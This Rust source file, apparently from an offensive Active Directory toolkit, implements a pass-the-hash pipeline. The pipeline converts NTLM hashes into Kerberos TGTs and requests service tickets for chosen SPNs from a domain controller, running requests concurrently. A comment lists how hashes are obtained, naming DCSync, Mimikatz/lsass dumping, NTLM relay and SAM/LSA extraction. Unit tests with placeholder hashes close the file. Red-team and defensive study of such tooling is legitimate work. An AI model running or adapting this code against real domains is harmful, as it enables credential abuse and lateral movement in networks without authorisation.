//! NTLM Hash → TGT Request Pipeline
//!
//! Converts collected NTLM hashes into working Kerberos TGTs by:
//! 1. Taking NTLM hashes from reaper enumeration (users, computers, gMSA)
//! 2. Requesting TGTs using pass-the-hash authentication
//! 3. Validating TGTs work against the DC
//! 4. Returning ready-to-use credentials with ticket data
//!
//! This bridges the gap between credential collection (reaper) and
//! ticket-based attacks (forge/hunter).

use overthrone_core::error::Result;
use overthrone_core::proto::kerberos;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

/// Configuration for NTLM-to-TGT pipeline
#[derive(Debug, Clone)]
pub struct NtlmToTgtConfig {
    /// Domain controller IP
    pub dc_ip: String,
    /// Domain FQDN
    pub domain: String,
    /// NTLM hashes to convert (format: username:ntlm_hash)
    pub ntlm_hashes: Vec<(String, String)>,
    /// Request service tickets for these SPNs after getting TGT
    pub target_spns: Vec<String>,
    /// Maximum concurrent TGT requests
    pub max_concurrent: usize,
    /// Timeout per TGT request (seconds)
    pub timeout_secs: u64,
}

impl Default for NtlmToTgtConfig {
    fn default() -> Self {
        Self {
            dc_ip: String::new(),
            domain: String::new(),
            ntlm_hashes: Vec::new(),
            target_spns: Vec::new(),
            max_concurrent: 5,
            timeout_secs: 10,
        }
    }
}

/// Result of NTLM-to-TGT conversion
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NtlmToTgtResult {
    /// Successfully converted TGTs
    pub successful_tgts: Vec<TgtCredential>,
    /// Failed conversions
    pub failed: Vec<(String, String)>,
    /// Total attempted
    pub total_attempted: usize,
    /// Total successful
    pub total_successful: usize,
    /// Total failed
    pub total_failed: usize,
    /// Processing time in milliseconds
    pub processing_time_ms: u64,
}

/// Working TGT credential
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TgtCredential {
    /// Username
    pub username: String,
    /// Domain
    pub domain: String,
    /// NTLM hash used (redacted for display)
    pub hash_redacted: String,
    /// TGT ticket data (ASN.1 encoded)
    pub ticket_data: Vec<u8>,
    /// Session key (encrypted)
    pub session_key: Vec<u8>,
    /// Ticket expiry timestamp
    pub ticket_expiry: String,
    /// Service tickets requested (if any)
    pub service_tickets: Vec<ServiceTicket>,
    /// Whether TGT validation succeeded
    pub validation_success: bool,
}

/// Service ticket obtained via TGS-REQ
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServiceTicket {
    /// SPN
    pub spn: String,
    /// Ticket data
    pub ticket_data: Vec<u8>,
    /// Ticket expiry
    pub ticket_expiry: String,
}

/// Run NTLM-to-TGT pipeline
pub async fn run_ntlm_to_tgt(config: &NtlmToTgtConfig) -> Result<NtlmToTgtResult> {
    let start_time = std::time::Instant::now();

    info!(
        "Starting NTLM→TGT pipeline: {} hashes, {} target SPNs",
        config.ntlm_hashes.len(),
        config.target_spns.len()
    );

    let mut result = NtlmToTgtResult {
        successful_tgts: Vec::new(),
        failed: Vec::new(),
        total_attempted: config.ntlm_hashes.len(),
        total_successful: 0,
        total_failed: 0,
        processing_time_ms: 0,
    };

    // Process hashes with concurrency limit
    let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(config.max_concurrent));

    let mut handles = Vec::new();

    for (username, ntlm_hash) in &config.ntlm_hashes {
        let sem = semaphore.clone();
        let config = config.clone();
        let username = username.clone();
        let ntlm_hash = ntlm_hash.clone();

        let handle = tokio::spawn(async move {
            let _permit = sem.acquire().await.map_err(|e| {
                (
                    "<internal>".to_string(),
                    format!("Semaphore acquire failed: {e}"),
                )
            })?;
            process_single_ntlm(&config, &username, &ntlm_hash).await
        });

        handles.push(handle);
    }

    // Collect results
    for handle in handles {
        match handle.await {
            Ok(Ok(credential)) => {
                result.successful_tgts.push(credential);
                result.total_successful += 1;
            }
            Ok(Err((username, error))) => {
                result.failed.push((username, error));
                result.total_failed += 1;
            }
            Err(e) => {
                warn!("Task join error: {}", e);
                result.total_failed += 1;
            }
        }
    }

    result.processing_time_ms = start_time.elapsed().as_millis() as u64;

    // Print summary
    info!(
        "NTLM→TGT pipeline complete: {}/{} successful ({}ms)",
        result.total_successful, result.total_attempted, result.processing_time_ms
    );

    if result.total_successful > 0 {
        info!("Successful TGTs:");
        for tgt in &result.successful_tgts {
            info!(
                "  ✓ {}@{} (expires: {}, SPNs: {})",
                tgt.username,
                tgt.domain,
                tgt.ticket_expiry,
                tgt.service_tickets.len()
            );
        }
    }

    if result.total_failed > 0 {
        warn!("Failed conversions:");
        for (username, error) in &result.failed {
            warn!("  ✗ {}: {}", username, error);
        }
    }

    Ok(result)
}

/// Process a single NTLM hash to TGT
async fn process_single_ntlm(
    config: &NtlmToTgtConfig,
    username: &str,
    ntlm_hash: &str,
) -> std::result::Result<TgtCredential, (String, String)> {
    info!("  Processing {}@{} ...", username, config.domain);

    // Step 1: Request TGT using NTLM hash
    let tgt = match kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        username,
        ntlm_hash,
        true, // use_hash = true for pass-the-hash
    )
    .await
    {
        Ok(tgt) => tgt,
        Err(e) => {
            return Err((username.to_string(), format!("TGT request failed: {}", e)));
        }
    };

    info!("  ✓ TGT obtained for {}@{}", username, config.domain);

    // Step 2: Extract ticket data (use encrypted ticket cipher bytes)
    let ticket_data = tgt.ticket.enc_part.cipher.clone();
    let session_key = tgt.session_key.clone();

    let ticket_expiry = if let Some(end_time) = &tgt.end_time {
        end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
    } else {
        "Unknown".to_string()
    };

    // Step 3: Request service tickets if SPNs specified
    let mut service_tickets = Vec::new();

    for spn in &config.target_spns {
        match kerberos::request_service_ticket(&config.dc_ip, &tgt, spn).await {
            Ok(st) => {
                let st_data = st.ticket.enc_part.cipher.clone();
                let st_expiry = if let Some(end_time) = &st.end_time {
                    end_time.format("%Y-%m-%d %H:%M:%S UTC").to_string()
                } else {
                    "Unknown".to_string()
                };

                service_tickets.push(ServiceTicket {
                    spn: spn.clone(),
                    ticket_data: st_data,
                    ticket_expiry: st_expiry,
                });

                info!("    ✓ Service ticket for {}", spn);
            }
            Err(e) => {
                warn!("    ✗ Service ticket for {} failed: {}", spn, e);
            }
        }
    }

    // Step 4: Validate TGT (simple check - can we parse it?)
    let validation_success = !ticket_data.is_empty();

    // Redact hash for safe display (show first 4 and last 4 chars)
    let hash_redacted = if ntlm_hash.len() > 8 {
        format!(
            "{}********{}",
            &ntlm_hash[..4],
            &ntlm_hash[ntlm_hash.len() - 4..]
        )
    } else {
        "****".to_string()
    };

    Ok(TgtCredential {
        username: username.to_string(),
        domain: config.domain.clone(),
        hash_redacted,
        ticket_data,
        session_key,
        ticket_expiry,
        service_tickets,
        validation_success,
    })
}

/// Helper: Generate NTLM hashes for testing
/// NOTE: In real usage, NTLM hashes come from:
/// - DCSync (overthrone-forge::dcsync_user)
/// - Credential dumping (Mimikatz, lsass dump)
/// - NTLM relay captures (overthrone-relay)
/// - SAM/LSA extraction (registry hives)
///
/// LDAP enumeration (reaper) does NOT return NTLM hashes -
/// they must be obtained through other means.
#[cfg(test)]
pub fn generate_test_hashes() -> Vec<(String, String)> {
    vec![
        (
            "testuser1".to_string(),
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4".to_string(),
        ),
        (
            "testuser2".to_string(),
            "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5".to_string(),
        ),
        (
            "admin".to_string(),
            "c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6".to_string(),
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_default() {
        let config = NtlmToTgtConfig::default();
        assert_eq!(config.max_concurrent, 5);
        assert_eq!(config.timeout_secs, 10);
        assert!(config.ntlm_hashes.is_empty());
    }

    #[test]
    fn test_generate_test_hashes() {
        let hashes = generate_test_hashes();
        assert_eq!(hashes.len(), 3);
        assert_eq!(hashes[0].0, "testuser1");
        assert_eq!(hashes[0].1, "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4");
        assert_eq!(hashes[1].0, "testuser2");
        assert_eq!(hashes[2].0, "admin");
    }

    #[test]
    fn test_hash_redaction() {
        let hash = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4";
        let redacted = if hash.len() > 8 {
            format!("{}********{}", &hash[..4], &hash[hash.len() - 4..])
        } else {
            "****".to_string()
        };
        assert_eq!(redacted, "a1b2********c3d4");
    }

    #[test]
    fn test_short_hash_redaction() {
        let hash = "abc";
        let redacted = if hash.len() > 8 {
            format!("{}********{}", &hash[..4], &hash[hash.len() - 4..])
        } else {
            "****".to_string()
        };
        assert_eq!(redacted, "****");
    }

    #[test]
    fn test_result_serialization() {
        let result = NtlmToTgtResult {
            successful_tgts: vec![TgtCredential {
                username: "testuser".to_string(),
                domain: "corp.local".to_string(),
                hash_redacted: "a1b2********c3d4".to_string(),
                ticket_data: vec![1, 2, 3],
                session_key: vec![4, 5, 6],
                ticket_expiry: "2024-12-31 23:59:59 UTC".to_string(),
                service_tickets: vec![],
                validation_success: true,
            }],
            failed: vec![("baduser".to_string(), "TGT request failed".to_string())],
            total_attempted: 2,
            total_successful: 1,
            total_failed: 1,
            processing_time_ms: 1234,
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("testuser"));
        assert!(json.contains("corp.local"));
        assert!(json.contains("a1b2********c3d4"));
    }

    #[test]
    fn test_result_deserialization() {
        let json = r#"{
            "successful_tgts": [],
            "failed": [],
            "total_attempted": 0,
            "total_successful": 0,
            "total_failed": 0,
            "processing_time_ms": 0
        }"#;

        let result: NtlmToTgtResult = serde_json::from_str(json).unwrap();
        assert_eq!(result.total_attempted, 0);
        assert_eq!(result.total_successful, 0);
    }

    #[test]
    fn test_service_ticket_serialization() {
        let st = ServiceTicket {
            spn: "cifs/dc01.corp.local".to_string(),
            ticket_data: vec![10, 20, 30],
            ticket_expiry: "2024-12-31 23:59:59 UTC".to_string(),
        };

        let json = serde_json::to_string(&st).unwrap();
        assert!(json.contains("cifs/dc01.corp.local"));
    }

    #[test]
    fn test_tgt_credential_fields() {
        let credential = TgtCredential {
            username: "admin".to_string(),
            domain: "test.local".to_string(),
            hash_redacted: "test".to_string(),
            ticket_data: vec![1, 2, 3],
            session_key: vec![4, 5, 6],
            ticket_expiry: "2024-01-01 00:00:00 UTC".to_string(),
            service_tickets: vec![ServiceTicket {
                spn: "ldap/dc01.test.local".to_string(),
                ticket_data: vec![7, 8, 9],
                ticket_expiry: "2024-01-01 10:00:00 UTC".to_string(),
            }],
            validation_success: true,
        };

        assert_eq!(credential.username, "admin");
        assert_eq!(credential.domain, "test.local");
        assert_eq!(credential.service_tickets.len(), 1);
        assert!(credential.validation_success);
    }
}
